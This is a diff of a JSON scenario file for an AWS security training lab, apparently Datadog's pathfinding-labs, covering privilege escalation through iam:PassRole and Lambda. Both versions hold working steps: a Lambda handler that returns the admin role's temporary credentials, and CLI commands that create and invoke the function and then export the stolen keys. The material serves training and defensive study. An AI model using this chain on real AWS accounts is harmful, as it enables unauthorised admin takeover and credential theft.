@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction",
+  "displayName": "Lambda Function Creation + Invocation to Admin",
   "name": "lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction",
   "description": "Creating Lambda function with admin role and invoking it to extract temporary credentials",
   "costEstimate": "$0/mo",
@@ -31,21 +31,24 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-lambda-001-to-admin-target-role",
         "description": "allows associating the admin role as the Lambda execution role"
       },
       {
         "permission": "lambda:CreateFunction",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "resource": "*",
         "description": "allows creating a new Lambda function"
       },
       {
         "permission": "lambda:InvokeFunction",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "resource": "*",
         "description": "allows invoking the Lambda function to extract credentials"
       }
@@ -53,14 +56,17 @@
     "helpful": [
       {
         "permission": "iam:ListRoles",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "purpose": "discover available privileged roles that can be passed to Lambda"
       },
       {
         "permission": "lambda:GetFunction",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "purpose": "verify function creation succeeded before invoking"
       },
       {
         "permission": "lambda:DeleteFunction",
+        "principal": "pl-prod-lambda-001-to-admin-starting-user",
         "purpose": "clean up attack artifacts after credential extraction"
       }
     ]
@@ -116,7 +122,7 @@
         "label": "Lambda Function",
         "type": "resource",
         "subType": "lambda-function",
-        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-attack",
+        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-credential-extractor",
         "description": "This Lambda function is created by the attacker during the attack. It is configured to use the admin target role as its execution role. When invoked, the function returns the temporary AWS credentials it received from the execution role, allowing the attacker to operate as the admin role.\n"
       },
       {
@@ -136,19 +142,21 @@
         "label": "iam:PassRole + lambda:CreateFunction",
         "description": "Create a Lambda function that uses the admin target role as its execution role. The iam:PassRole permission allows the starting user to associate the admin role with the new Lambda function.\n",
         "hints": [
-          "You can pass an IAM role to a Lambda function when creating it.",
-          "Lambda functions automatically receive temporary credentials for their execution role.",
-          "Create a Lambda function with the admin role, invoke it to extract credentials, then use those credentials.",
+          "Review the policy attached to this user -- which IAM role can you pass, and to which service?",
+          "Use iam:ListRoles to discover roles in the account and identify which ones have elevated permissions.",
+          "You can attach an IAM role to a Lambda function at creation time using the --role flag; this is what iam:PassRole enables.",
+          "Write a minimal Lambda handler that reads and returns the execution role credentials from environment variables -- AWS injects them automatically.",
+          "Package your handler as a zip file and use lambda:CreateFunction to deploy it with the admin role as the execution role.",
           "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
         ],
         "commands": [
           {
             "description": "Create a Lambda deployment package that extracts execution role credentials",
-            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport os, json\ndef lambda_handler(event, context):\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n            'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n            'session_token': os.environ['AWS_SESSION_TOKEN']\n        })\n    }\nEOF\ncd /tmp && zip lambda_payload.zip lambda_function.py\n"
+            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport os, json\ndef lambda_handler(event, context):\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),\n            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),\n            'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN')\n        })\n    }\nEOF\ncd /tmp && zip -q lambda_function.zip lambda_function.py\n"
           },
           {
             "description": "Create the Lambda function with the admin execution role",
-            "command": "aws lambda create-function --function-name pl-lambda-001-attack --runtime python3.12 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip"
+            "command": "aws lambda create-function --function-name pl-lambda-001-credential-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
           }
         ]
       },
@@ -158,21 +166,24 @@
         "label": "lambda:InvokeFunction",
         "description": "Invoke the Lambda function to execute code under the admin role's identity. The function returns the temporary credentials assigned to it via the execution role, granting the attacker administrative access.\n",
         "hints": [
-          "Lambda functions receive credentials via environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN.",
-          "Write a handler that reads and returns these environment variables, then invoke the function."
+          "Lambda functions need a few seconds to initialize after creation before they are ready to invoke.",
+          "Use lambda:GetFunction to check the function's State field and confirm it is Active before invoking.",
+          "Invoke the function with an empty payload and capture the response to a local file; the credentials are in the response body.",
+          "The response body is a JSON-encoded string -- you need to parse it twice (outer response, then the body field) to extract the three credential values.",
+          "Export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the parsed response, then verify your new identity with sts:GetCallerIdentity."
         ],
         "commands": [
           {
-            "description": "Invoke the Lambda function and extract the temporary admin credentials",
-            "command": "aws lambda invoke --function-name pl-lambda-001-attack /tmp/lambda_output.json && cat /tmp/lambda_output.json"
+            "description": "Invoke the Lambda function and capture the response",
+            "command": "aws lambda invoke --function-name pl-lambda-001-credential-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
           },
           {
-            "description": "Configure the AWS CLI with the extracted temporary credentials",
-            "command": "export AWS_ACCESS_KEY_ID=<access_key> && export AWS_SECRET_ACCESS_KEY=<secret_key> && export AWS_SESSION_TOKEN=<session_token>"
+            "description": "Parse and export the extracted admin credentials",
+            "command": "BODY=$(cat /tmp/response.json | jq -r '.body') && export AWS_ACCESS_KEY_ID=$(echo \"$BODY\" | jq -r '.AWS_ACCESS_KEY_ID') && export AWS_SECRET_ACCESS_KEY=$(echo \"$BODY\" | jq -r '.AWS_SECRET_ACCESS_KEY') && export AWS_SESSION_TOKEN=$(echo \"$BODY\" | jq -r '.AWS_SESSION_TOKEN')"
           },
           {
             "description": "Verify administrator access",
-            "command": "aws iam list-users"
+            "command": "aws sts get-caller-identity && aws iam list-users --max-items 3 --output table"
           }
         ]
       }
